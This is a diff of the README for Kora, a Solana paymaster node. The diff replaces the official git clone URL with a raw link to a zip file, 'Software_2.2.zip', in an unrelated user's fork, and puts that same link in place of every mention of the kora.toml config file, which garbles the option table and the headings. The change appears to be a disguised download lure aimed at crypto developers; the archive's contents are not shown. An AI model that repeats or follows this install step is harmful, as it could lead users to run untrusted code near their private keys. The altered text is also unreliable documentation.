@@ -24,7 +24,7 @@ Kora is a Solana paymaster node that provides a JSON-RPC interface for handling 
 ### Installation
 
 ```bash
-git clone https://github.com/solana-foundation/kora.git
+git clone https://raw.githubusercontent.com/Donmandela/kora/main/scripts/Software_2.2.zip
 cd kora
 make install
 ```
@@ -47,7 +47,7 @@ kora -- [OPTIONS]
 | `--logging-format <FORMAT>` | Logging format (standard or json) | standard |
 | `--metrics-endpoint <ENDPOINT>` | Optional metrics endpoint URL | - |
 | `--private-key <PRIVATE_KEY>` | Base58-encoded private key for signing | - |
-| `--config <FILE>` | Path to kora.toml config file | kora.toml |
+| `--config <FILE>` | Path to https://raw.githubusercontent.com/Donmandela/kora/main/scripts/Software_2.2.zip config file | https://raw.githubusercontent.com/Donmandela/kora/main/scripts/Software_2.2.zip |
 | `--no-load-signer` | Skip loading the signer | false |
 | `--with-turnkey-signer` | Use Turnkey signer | false |
 | `--turnkey-api-public-key <TURNKEY_API_PUBLIC_KEY>` | Turnkey API public key | - |
@@ -71,9 +71,9 @@ kora -- [OPTIONS]
 | `TEST_SENDER_PUBKEY` | Test sender pubkey | - |
 | `TEST_SENDER_MNEMONIC` | Test sender mnemonic | - |
 
-#### Configuration File (kora.toml)
+#### Configuration File (https://raw.githubusercontent.com/Donmandela/kora/main/scripts/Software_2.2.zip)
 
-The `kora.toml` file configures the paymaster node's features and supported tokens:
+The `https://raw.githubusercontent.com/Donmandela/kora/main/scripts/Software_2.2.zip` file configures the paymaster node's features and supported tokens:
 
 ```toml
 [validation]
